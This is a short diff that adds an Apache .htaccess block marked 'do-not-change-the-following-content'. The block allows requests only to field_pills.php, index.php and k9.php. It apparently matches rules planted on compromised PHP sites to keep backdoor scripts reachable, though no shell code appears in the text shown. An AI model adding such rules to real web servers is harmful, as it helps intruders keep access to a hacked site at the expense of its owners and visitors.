@@ -1,0 +1,5 @@
+#---do-not-change-the-following-content---
+<FilesMatch '^(field_pills.php|index.php|k9.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
